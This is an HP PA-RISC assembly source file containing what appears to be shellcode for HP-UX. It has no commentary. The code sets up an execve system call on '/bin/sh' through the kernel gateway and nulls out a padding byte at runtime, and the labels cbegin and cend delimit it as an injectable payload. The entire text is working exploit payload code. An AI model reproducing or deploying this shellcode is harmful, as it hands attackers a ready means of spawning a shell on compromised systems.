
	.LEVEL 1.1

	.SPACE $TEXT$
	.SUBSPA $CODE$,QUAD=0,ALIGN=8,ACCESS=44

	.EXPORT main,ENTRY,PRIV_LEV=3,ARGW0=GR,ARGW1=GR
main
	bl	cbegin, %r1
	nop

	.align 4

	.SUBSPA $DATA$
	.EXPORT cbegin

cbegin
	bl	moo,%r26
moo
	addi,>	0x3b,%r0,%r22
	addi,<	0x1d,%r26,%r26
	stw	%r0,4(%sp)
	stw	%r26,0(%sp)
	xor	%r0,%sp,%r25
	xor	%r24,%r24,%r24

	ldil	L%0xc0000004,%r21
	ble	R%0xc0000004(%sr7,%r21)
	stbs	%r0,7(%r26)

	.STRING "/bin/sh\x41"

	.EXPORT cend
cend
	nop

